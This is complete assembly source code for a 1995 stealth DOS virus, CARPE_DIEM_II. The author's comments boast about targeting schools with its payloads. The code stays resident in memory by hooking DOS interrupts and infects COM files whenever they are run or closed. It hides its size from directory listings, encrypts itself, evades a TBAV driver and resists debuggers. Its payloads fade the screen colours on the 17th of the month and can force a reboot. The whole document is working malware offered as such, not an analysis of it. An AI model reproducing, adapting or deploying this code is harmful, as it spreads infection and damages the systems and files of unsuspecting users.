; This is some version of CARPE_DIEM_II.

; First of all - I would like to thank the following people for
; helping me out:

; Blonde        - Without your assistence, this virus would be no
;                 full stealth virus, hurray for you.
; Conzouler     - For general assistence concerning bug-eliminating.
; Stormbringer  - For writing code which make sense.
; Priest        - For the code-fragments included, hints, ideas,
;                 and happy comments!

; Anyhow, you've seen nearly seen this before. But it has (again)
; taken a new shape.

; I would like to point out that this version is under no circumstances
; destructive. It might bug sometime while spreading in weird invoroments,
; but since I run pure DOS myself - I havn't done a depth in study
; conserning how and when. Deal with it.

; The name is a bit confusing I think. I.e. I find the quation from
; Horatius (partly) wrong.

; The greek - swedish - english translation could read something like:

; "Seize the day and trust as less as possible on the future. . . "

; ... but since the future isn't tommorow, but now, I find it a
;     bit irritating. Ah well.

; Anyhow - it's an old simply com-infector, and since it infects
; com-files only - it won't spread very far. But since my favorite
; targets are schools and since my mission is to annoy them as
; much as possible (with payloads), I reckon it does its work good 
; enough. (Ask Billy The Kid's sysadm! :)).

; It isn't too visible since it will stealth file-size increases,
; and disinfect files opened. It has though some pretty visible
; payloads (black-to white color-fade all the time the 17.ten and
; it might print and reboot sometimes. . ).

; It includes encryption, soft-anti-debugging, anti-tb*, otherwise,
; it's pretty much your average virus.

; Further greetings goes out to all of VLAD and all of #virus :).

; Sincerly - The Unforgiven, Immortal Riot - National Malware Developemt, 1995.

.model tiny
.code
org 100h

vir_size equ end_of_virus-start_of_virus

start_of_virus:
vstart:

    jmp entry_point

install:

    mov ah,2ah                      ;get date
    int 21h
    cmp dl,17d                      ;day = 17?
    jne get                         ;naw!
    mov cs:[activate_flag],1        ;yeh!

get:
    mov ah,4ah                      ;Installation check for the runtime
    mov bx,0FFFFH                   ;part. (This is overkill)
    mov cx,0bebeh
    int 21h
    cmp ax,cx                       ;ax=cx=0bebe?
    jne not_res                     ;no!
    jmp already_resident

not_res:
    mov ah,4ah                      ;Use normal DOS-functions to 
    sub bx,(vir_size+15)/16+1       ;fix the TSR part.
    int 21h                         ;(c) DA/PS ??

    mov ah,48h                      ;allocate enough room for our code
    mov bx,(vir_size+15)/16
    int 21h

    dec ax                          ;ax-1 = MCB for allocated memory
    mov es,ax                       ;es=segment
    mov word ptr es:[1],8           ;Mark DOS as owner

    push cs                         ;cs=ds
    pop ds

    cld                             ;clear direction for string operations
    sub ax,0fh                      ;100h bytes from allocstart
    mov es,ax                       ;es:[100h] = start of allocated memory
    mov di,100h
    lea si,[bp+offset start_of_virus]
    mov cx,(vir_size+1)/2           ;copy entire virus to memory
    rep movsw                       
				    
    push es                         ;es=ds
    pop ds

    mov ax,3521h                    ;get interrupt vector from es:bx for
    int 21h                         ;int21h

tb_lup:
    cmp word ptr es:[bx],05ebh   ;check for short jump
    jne no_tbdriver
    cmp byte ptr es:[bx+2],0eah  ;and for far jump to next int handler
    jne no_tbdriver
    les bx,es:[bx+3]             ;if found TBdriver, get next int
    jmp tb_lup                   ;handler and use that as int 21 adr

no_tbdriver:

    mov word ptr ds:[Org21ofs],bx   ;save segment:offset for int21h
    mov word ptr ds:[Org21seg],es   ;in a word each

    cmp byte ptr cs:[activate_flag],1       
    jne skip_08_get                 ;not the 17:ten!

    mov al,08h
    int 21h
    mov word ptr ds:[org08ofs],bx
    mov word ptr ds:[org08seg],es

skip_08_get:

    mov al,09h                      ;get interrupt vector for int09h 
    int 21h                         ;as well as
    mov word ptr ds:[org09ofs],bx  
    mov word ptr ds:[org09seg],es

    mov dx, offset new_int21h       ;set new int.vector for 21h to ds:dx
    mov ax,2521h
    int 21h

    cmp byte ptr cs:[activate_flag],1       ;day = 17?
    jne skip_08_set                         ;no!

    mov dx, offset new_08h
    mov al,08h
    int 21h

skip_08_set:
    mov dx,offset new_09h                  ;09
    mov al,09h
    int 21h

already_resident:
tbdriver:
    mov di,100h                     ;transer back control to the infected
    push di                         ;host program.
    push cs                         ;make cs=ds=es
    push cs
    pop es
    pop ds
    lea si,[bp+orgjmp]              ;move orgjmp of 4 bytes to the
    movsw                           ;correct (100h) memory adress.
    movsw
exit:
     ret                            ;and exit!


;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;              This is the new int21h Handler
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
new_int21h:
    cmp ah,4ah                    ;ah=4ah?
    jne chk_exec                  ;no!
    cmp bx,0ffffh                 ;bx = -1?
    jne no_match                  ;no!
    cmp cx,0bebeh                 ;cx = 0bebeh?
    jne no_match                  ;no!
    mov ax,cx                     ;=> Installation check, move bebe into ax
    iret                          ;and return (ax=cx=0bebeh)

chk_exec:
    cmp ax,4b00h                   ;infect on execute
    je go_infect

chk_close:
    cmp ah,3eh                     ;infect on file-closes
    je go_close

    cmp ah,3dh                     ;normal file-open? - Disinfect
    je go_disinfect

chk_dir:
    cmp ah,11h                     ;stealth file size increase on
    je go_fcb_stealth              ;directory listenings using
    cmp ah,12h                     ;functions 11/12/4e/4fh
    je go_fcb_stealth

    cmp ah,4eh                     
    je go_handle_stealth           

    cmp ah,4fh
    je go_handle_stealth

no_match:
    jmp do_oldint21h              ;jmp org vector

go_infect:
    jmp infect

go_close:
    call setcritical
    jmp infect_close

go_disinfect:
    call setcritical
    jmp open_disinfect

go_fcb_stealth:
    jmp hide_dir

go_handle_stealth:
    jmp hide_dir2

dps db "CARPE_DIEM_II - FLOATING THROUGH THE VOID!",7,0 ;CC

;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;                  This is the new int08h Handler
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
new_08h:
    push ax                     ;Toy with the black-ground color!!
    push dx
    mov dx,03c8h
    xor al,al
    out dx,al
    inc dx
    mov al,[cs:bgcol]
    out dx,al
    out dx,al
    out dx,al
    inc [cs:bgcol]
    pop dx
    pop ax

do_old08h:
    db 0eah                         ;and jump to saved vector for int08h
    org08ofs dw ?
    org08seg dw ?


;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;                  This is the new int09h Handler
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
new_09h:
    push ax                         ;preserve register in use
    push ds

    xor ax,ax                       
    mov ds,ax                       ;ds=0

    in al,60h                       ;read key
    cmp al,53h                      ;delete?
    jnz no_ctrl_alt_del             ;no!

    test byte ptr ds:[0417h],0ch    ;test for alt-ctrl
    je no_ctrl_alt_del              ;no. . 
    
    in al,41h                       ;get random value 
    test al,11111b                  ;2^5 = 32
    jne no_ctrl_alt_del             ;value doesnt match!

    push cs                         ;cs=ds             
    pop ds

    mov ax,3                        ;set grafic mode (text)
    int 10h
	
    mov ah,2                        ;set cursor pos
    xor bh,bh
    mov dx,0A14h                    ;10,20d (middle)
    int 10h
	
    mov ah,1                        ;set cursor
    mov cx,2020h                    ;>nul
    int 10h      

    mov si,offset dps               ;point to v_name

all_chars:     
    loop all_chars
    lodsb                          ;load string by byte from dps
    or al,al                       ;end of string? (al=0)
    je cold_boot                   ;yes, make a cold boot
	
    mov ah,0Eh                     ;display character from string
    int 10h                        
	
    jmp short all_chars            ;put next char to string

cold_boot:
    db 0eah                         ;jmp far ptr
    db 00h, 00h, 0ffh, 0ffh         ;coldboot vector

no_ctrl_alt_del:
    pop ds                          ;restore registers
    pop ax

do_oldint09h:
    db 0eah                         ;and jump to saved vector for int09h
    org09ofs dw ?
    org09seg dw ?

;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;               This will fool directory listenings using FCBs
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
hide_dir:                           ;FCB stealth routine
    pushf                           ;simulate a int call with pushf
    push cs                         ;and cs, ip on the stack
    call do_oldint21h
    or al,al                        ;was the dir call successfull??
    jnz skip_dir                    ;naw!

    push ax 
    push bx 
    push es                        

    mov ah,62h                      ;get active PSP to es:bx (51h as well)
    int 21h
    mov es,bx
    cmp bx,es:[16h]                 ;PSP belongs to dos?
    jnz bad_psp                     ;no, we don't want chkdsk fuck-up's!

    mov bx,dx
    mov al,[bx]                     ;al holds current drive - FFh means
    push ax                         ;extended FCB
    mov ah,2fh                      ;get DTA-area
    int 21h
    pop ax
    inc al                          ;is it an extended FCB
    jnz no_ext
    add bx,7                        ;if so add 7 to skip garbage
no_ext:
    mov al,byte ptr es:[bx+17h]     ;get seconds field
    and al,1fh
    xor al,1dh                      ;is the file infected??
    jnz no_stealth                  ;if not - don't hide size

    cmp word ptr es:[bx+1dh],vir_size-3 ;if a file with same seconds
    jbe no_stealth                      ;as an infected is smaller -
    sub word ptr es:[bx+1dh],vir_size-3 ;don't hide size
no_stealth:                                 
bad_psp:
    pop es 
    pop bx 
    pop ax                          
skip_dir:
    iret

;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;             This will fool directory listenings using File Handles
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
hide_dir2:

    pushf                                        
    push cs                         
    call do_oldint21h

    jc no_files                 

    pushf
    push ax                              
    push di
    push es 
    push bx                 

    mov ah,2fh                          ;Get DTA-area
    int 21h

    mov di,bx
    add di,1eh
    cld
    mov cx,9                            ;scan for the dot which
    mov al,'.'                          ;extension
    repne scasb                         ;
    jne not_inf

    cmp word ptr es:[di],'OC'            ;CO?
    jne not_inf                          ;yeh!

    cmp byte ptr es:[di+2],'M'           ;COM?
    jne not_inf                          ;yeh! 

    mov ax,es:[bx+16h]                      ;ask file time
    and al,1fh
    xor al,1dh                              ;is the file infected??
    jnz not_inf                  

    cmp word ptr es:[bx+1ah],vir_size      ;dont stealth too small
    ja  hide                               ;files

    cmp word ptr es:[bx+1ch],0              ;or too damn big files
    je  not_inf

hide:  
    sub es:[bx+1ah],vir_size-3              ;<- no, its not a SUB-routine! :)

not_inf:
    pop bx
    pop es
    pop di
    pop ax
    popf

no_files:
    retf 2                                  ;return and pop 2 of stack

infect_close:
    push es                                 
    push bp 
    push ax 
    push bx 
    push cx 
    push si 
    push di 
    push ds 
    push dx
    cmp bx,4                        ;don't close null, aux and so
    jbe no_close

    call check_name                 ;es:di points to file name
    add di,8                        ;es:di points to extension
    cmp word ptr es:[di],'OC'
    jne no_close
    cmp byte ptr es:[di+2],'M'      ;if COM infect it!
    je close_infection

no_close:
    pop dx                          ;No comfile!
    pop ds 
    pop di 
    pop si 
    pop cx 
    pop bx 
    pop ax 
    pop bp 
    pop es

    jmp do_oldint21h

close_infection:
    mov byte ptr es:[di-26h],2      ;mark read & write access
    mov cs:Closeflag,1              ;raise closeflag for exit procedure

    mov ax,4200h                    ;rewind file
    xor cx,cx
    cwd
    int 21h

    jmp short infect_on_close       ;infect it
check_name:
    push bx
    mov ax,1220h                    ;get job file table for handle at es:di
    int 2fh

    mov ax,1216h                    ;get system file table
    mov bl,byte ptr es:[di]         ;for handle index in bx
    int 2fh
    pop bx
    add di,20h                      ;es:di+20h points to file name
    ret                             ;return

infect:                             
    push es 
    push bp 
    push ax 
    push bx 
    push cx 
    push si 
    push di 
    push ds 
    push dx 

    call setcritical

    mov cs:Closeflag,0              ;make sure closeflag is off
    mov ax,4300h                    ;get attrib
    int 21h
    push cx                         ;save attrib onto the stack
    mov ax,4301h                    ;clear attrib
    xor cx,cx
    int 21h

    mov ax,3d02h                    ;open file
    pushf                           
    push cs                        
    call do_oldint21h              

    xchg ax,bx                      ;bx = file handle

infect_on_close:                    ;entry for infection on 3eh

    push cs                         ;cs=ds
    pop ds

    mov ax,5700h                    ;get time/date
    int 21h
    push cx                         ;save time/date onto the stack
    push dx

    mov ah,3fh                      ;read three bytes to orgjmp
    mov cx,4
    mov dx,offset ds:orgjmp
    int 21h

    cmp word ptr ds:orgjmp,'ZM'     ;check if .EXE file
    je exe_file
    cmp word ptr ds:orgjmp,'MZ'
    je exe_file                     ;if so - don't infect

;   cmp byte ptr ds:orgjmp+1,'m'    ;dont infect command.com
;   je skip_infect                  ;beta versions ONLY!

    cmp byte ptr ds:orgjmp+3,''    ;dont reinfect files!
    jne lseek_eof
    jmp short skip_infect

exe_file:
    mov cs:exeflag,1                ;mark file as EXE-file, and
    jmp short skip_infect           ;don't set second value for it!

lseek_eof:
    mov ax,4202h                    ;go end of file, offset in dx:cx
    xor cx,cx                       ;and return file size in dx:ax.
    xor dx,dx
    int 21h

    cmp ax,(0FFFFH-Vir_size)        ;file is too big?
    jae skip_infect                 ;yeh
    cmp ax,(vir_size-100h)          ;file is too small?
    jb skip_infect                  ;yeh

    add ax,offset entry_point-106h  ;calculate entry offset to jmp
    mov word ptr ds:newjmp[1],ax    ;move it to newjmp

get_rnd:
    mov ah,2ch                      ;get random number and put enc_val
    int 21h
    or dl,dl                        ;dl=0 - get another value!
    je get_rnd
    mov word ptr ds:enc_val,dx
    mov ax,08d00h                   ;copy entire virus to 8d00h:100h
    mov es,ax
    mov di,100h
    mov si,di
    mov cx,(vir_size+1)/2
    rep movsw
    push es
    pop ds
    xor bp,bp                       ;and encrypt it there
    call encrypt

    mov ah,40h                      ;write virus to file from position
    mov cx,end_of_virus-install     ;08d00h:100h
    mov dx,offset install
    int 21h

    push cs                         ;cs=ds
    pop ds

    mov ax,4200h                    ;go to beginning of file
    xor cx,cx
    cwd
    int 21h

    mov ah,40h                      ;and write a new-jmp-construct
    mov cx,4                        ;of 4 bytes (4byte=infection marker)
    mov dx,offset newjmp
    int 21h

skip_infect:
    mov ax,5701h                    ;restore
    pop dx                          ;date
    pop cx                          ;time
    cmp byte ptr cs:[exeflag],1     ;exe file?
    je skip_sec                     ;if so - keep the sec_value intact
    or cl,00011101b                 ;and give com-files second value
    and cl,11111101b                ;29
skip_sec:
    int 21h
    cmp byte ptr cs:[Closeflag],1   ;check if execute or close infeection,
    je dont_close                   ;if infect on close, dont close file

close_file:
    mov ah,3eh                      ;close the file which were executed
    int 21h
    pop cx                          ;get original file-attribs
dont_close:
    pop dx                          ;ds:dx = filename
    pop ds
    cmp byte ptr cs:[Closeflag],1
    je exit_close
    mov ax,4301h                    ;set back saved attribute
    int 21h

exit_close:
    mov byte ptr cs:closeflag,0
    call resetcritical
    pop di 
    pop si 
    pop cx 
    pop bx 
    pop ax 
    pop bp 
    pop es          

do_oldint21h:                       
O21h:
    db 0eah                         ;jmp far ptr            
    org21ofs dw ?                   ;s:o to
    org21seg dw ?                   ;int21h

    ret                             ;call to DOS. . . return!

vir  db "SVW: The Unforgiven/Immortal Riot",0
fcl  db "Fuck Corporate Life!",0    ;I agree you SB!

closeflag     db 0                          ;0 if exec 1 if close
exeflag       db 0
activate_flag db 0
bgcol         db 0
newjmp        db 0e9h,00h,00h,''       ;buffer to calculate a new entry

;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;           Cheesy primitive disinfecting-on-the-fly routine
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
open_disinfect:                     ;ds:dx=filename...
     push ax 
     push bx 
     push cx 
     push dx 
     push di 
     push si 
     push ds 
     push es                             ;save all regs/segs...

     push ds
     pop es                              ;ds=es

     mov cx,64                           ;scan for the dot which
     mov di,dx                           ;seperates filename from
     mov al,'.'                          ;extension
     cld                                 ;clear direction
     repne scasb                         ;

     cmp word ptr ds:[di],'OC'           ;CO?
     je smallc                           ;yeh!
     cmp word ptr ds:[di],'oc'           ;co?
     jne nocom                           ;naw!

smallc:
     cmp byte ptr ds:[di+2],'M'          ;COM?
     je open_com                         ;yeh! 
     cmp byte ptr ds:[di+2],'m'          ;com?
     je open_com                         ;yeh!

nocom:
     jmp no_opendis                      ;no com-file being opened!

open_com:
     mov ax,3d02h                        ;open file with r/w access
     pushf
     push cs
     call o21h

     xchg bx,ax                          ;put filehandle in BX

     push cs                             ;cs=ds=es
     pop ds
     push ds
     pop es

     mov ax,5700h                       ;get file info
     int 21h
     push cx                            ;save time
     push dx                            ;and date

     and cl,1fh                         ;see if seconds = 29
     xor cl,1dh
     jne close_dis                      ;is not!

     mov ah,3fh                         ;read first four bytes
     mov cx,4                           ;to orgjmp
     mov dx,offset ds:orgjmp
     int 21h                           

     cmp byte ptr ds:orgjmp,0e9h        ;first byte = jmp?
     jne close_dis                      ;no!

     cmp byte ptr ds:orgjmp+3,''       ;infected?
     jne close_dis                      ;naw!

     mov ax,4202h                        ;seek end of file
     cwd
     xor cx,cx
     int 21h

     mov dx,ax                           ;dx=ax=file size
     sub ax,(vend-install+3)             ;substract orgjmp
 
     push dx                             ;save file size on stack
     xor ax,ax                           ;zero AX

     sub dx,(vend-orgjmp)                ;seek orgjmp location
     xor cx,cx                           ;in the infected file
     mov ah,42h
     int 21h

     mov ah,3fh                          ;read the original jump
     mov cx,4                            ;to orgjmp in memory
     mov dx,offset ds:orgjmp
     int 21h                              

     xor ax,ax                           ;zero AX

     cwd                                 ;seek beginning of file
     xor cx,cx
     mov ah,42h
     int 21h

     mov ah,40h                          ;write the original saved jmp
     mov dx,offset orgjmp                ;to top of file
     mov cx,4
     int 21h

     pop dx                              ;restore infected file size

     sub dx,(vend-install)               ;seek file-size - vir_size
     xor ax,ax
     xor cx,cx                                   
     mov ah,42h                                  
     int 21h

     mov ah,40h
     xor cx,cx                           ;write clean file
     int 21h                             

close_dis:
     mov ax,5701h                        ;restore saved
     pop dx                              ;date
     pop cx                              ;and time
     int 21h                             

     mov ah,3eh                          ;close the file
     pushf
     push cs
     call o21h                        

no_opendis:                             
     pop es 
     pop ds 
     pop si 
     pop di 
     pop dx 
     pop cx 
     pop bx 
     pop ax                             ;restore all segments/registers

bail_out:     
     jmp o21h                           ;and bail out!


; The Set/Restore critical error handler is written by Stormbringer
; of Phalcon/Skism. I borrowed it because I find it excellent
; coded. I call the routines a lot of times, so. . . credits to him.

SetCritical:
     push ax ds
     mov ax,9
     mov ds,ax
     push word ptr ds:[0]
     push word ptr ds:[2]
     pop word ptr cs:[OldCritical+2]
     pop word ptr cs:[OldCritical]
     mov word ptr ds:[0],offset CriticalError
     push cs
     pop word ptr ds:[02]
     pop ds ax
     ret
	
ResetCritical:
     push ax ds
     push word ptr cs:[OldCritical]
     mov ax,9
     push word ptr cs:[OldCritical+2]
     mov ds,ax
     pop word ptr ds:[2]
     pop word ptr ds:[0]
     pop ds ax
     ret

CriticalError:
     mov al,0
     iret

OldCritical     dd      0

; ---------------------------------------------------------
; All code below this point is unencrypted - only adresses
; caluculated from the base pointer will vary. Instructions
; are the same.
; ---------------------------------------------------------
decrypt:
encrypt:
    mov ax,word ptr ds:[bp+enc_val]         ;enc value in ax
    lea di,[bp+install]                     ;pointer to encryption start
    mov cx,(encrypt-install)/2              ;number of words to be encrypted
xor_loopy:
    xor word ptr ds:[di],ax                 
    inc di                                  
    inc di
    loop xor_loopy
    ret
enc_val dw 0

entry_point:
   mov sp,102h                            ;Alternative coding
   call get_bp                            ;to get the delta offset
					  ;Raver(tm)
get_bp:
    mov bp,word ptr ds:[100h]
    mov sp,0fffeh
    sub bp,offset get_bp

    mov si, offset ditch                   ;This routine will make
    add si,bp                              ;single-stepping programs
;   db 0ebh,0                              ;stop.
    mov byte ptr ds:[si],0c3h              
    ditch:                                  
    mov byte ptr ds:[si],0c6h

    call decrypt                            ;decrypt virus
    jmp install                             ;jmp to install code

orgjmp    db 0cdh,20h,00,00         ;buffer to save the 4 first bytes in,
				    ;remains unecrypted due to disinfection.
end_of_virus:
vend:

    end start_of_virus

